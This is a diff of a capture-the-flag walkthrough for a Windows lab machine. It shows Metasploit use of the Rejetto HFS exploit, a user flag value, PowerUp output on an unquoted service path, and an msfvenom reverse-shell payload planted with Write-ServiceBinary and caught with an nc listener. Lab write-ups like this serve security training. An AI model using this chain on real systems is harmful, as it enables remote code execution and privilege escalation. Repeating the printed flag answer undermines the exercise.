@@ -49,7 +49,7 @@ PORT      STATE SERVICE            VERSION
 
 - `msfconsole` to start Metasploit and `search cve-2014-6287` to find module listed on ExploitDB
 - `use 0` or `use exploit/windows/http/rejetto_hfs_exec` to select exploit
-- `set RHOSTS \<target ip>` and `set RPORT 8080` to point the exploit at the second web server on the target machine and `exploit`
+- `set RHOSTS <target ip>` and `set RPORT 8080` to point the exploit at the second web server on the target machine and `exploit`
 
 > <details><summary>When connected to the target via meterpreter shell, <code>cat C:/Users/bill/Desktop/user.txt</code> to get the flag: </summary>b04763b6fcf51fcd7c13abc7db4fd365</details>
 
@@ -64,15 +64,24 @@ PORT      STATE SERVICE            VERSION
 - Run `PowerUp.ps1` then use the `Invoke-AllChecks` cmdlet
 
 ```
-ServiceName                     : AdvancedSystemCareService9
-Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
-ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
-ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
-ModifiableFileIdentityReference : STEELMOUNTAIN\bill
-StartName                       : LocalSystem
-AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
-CanRestart                      : True
-Name                            : AdvancedSystemCareService9
-Check                           : Modifiable Service Files
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
 ```
 
+> The service that shows up is **AdvancedSystemCareService9**
+
+### What is the root flag?
+
+- The *PowerUp* scan results show that the service can be restarted, and the path can be edited
+- Generate shellcode to replace legitimate binary
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=<attack machine ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
+- Use the cmdlet listed in *AbuseFunction* section of the scan results to replace legitimate binary with malicious shellcode
+    - `Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe"`
+- Set up listener on attacker machine
+    - `nc -lvnp 4443`
